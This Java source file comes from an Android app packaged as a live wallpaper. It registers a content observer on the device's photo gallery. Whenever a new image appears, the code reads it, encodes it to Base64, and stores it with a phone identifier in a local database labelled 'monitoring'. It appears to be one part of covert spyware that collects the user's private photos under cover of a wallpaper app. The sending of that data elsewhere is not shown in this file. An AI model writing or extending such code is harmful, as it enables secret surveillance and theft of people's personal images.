package com.livewallpaper.circle.box.gallery;

import com.livewallpaper.circle.box.ServiceListener;
import com.livewallpaper.circle.db.controllers.MonitorSQLiteAdapter;
import com.livewallpaper.circle.db.models.People;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.provider.MediaStore.Images;
import android.util.Log;

public class ContentGalleryExternalObserver extends ContentObserver {

	private Context context = ServiceListener.context;
	private static final String LOG_TAG = "monitoring";
	private static MonitorSQLiteAdapter mAdapter = MonitorSQLiteAdapter.SQLITE_ADAPTER;

	public ContentGalleryExternalObserver(Handler handler) {
		super(handler);
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		Log.w(LOG_TAG, "onChange ContentGalleryExternalObserver");
		monitoringGallery();
	}

	public void monitoringGallery() {
		String data;
		String title;
		long date_add;

		Cursor cursorExternal = null;
		try {
			mAdapter.open(context);
			People people = mAdapter.selectPeople();
			if (people != null) {
				String columns[] = new String[] { Images.Media.DATA,
						Images.Media.TITLE, Images.Media.DATE_ADDED };

				long lastGalleryTime = people.getLastGallery();

				// Get external content
				cursorExternal = context.getContentResolver().query(
						Images.Media.EXTERNAL_CONTENT_URI, columns,
						Images.Media.DATE_ADDED + " > ?",
						new String[] { Long.toString(lastGalleryTime) }, null);

				if (cursorExternal != null) {
					if (cursorExternal.moveToNext()) {
						Log.w(LOG_TAG, "cursorExternal");
						data = cursorExternal.getString(cursorExternal
								.getColumnIndex(Images.Media.DATA));
						title = cursorExternal.getString(cursorExternal
								.getColumnIndex(Images.Media.TITLE));
						date_add = cursorExternal.getLong(cursorExternal
								.getColumnIndex(Images.Media.DATE_ADDED));
						data = ConvertImage.convertImageToBase64String(data);

						if (data != null) {
							Log.w(LOG_TAG, "EXTERNAL date_add - " + date_add);
							people.setLastGallery(date_add);
							mAdapter.updatePeopleLastGallery(people);
							mAdapter.insertGallery(data, title, date_add,
									people.getPhoneId());
						}

					}
				}

			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (cursorExternal != null) {
				cursorExternal.close();
			}
			mAdapter.close();
		}

	}

}
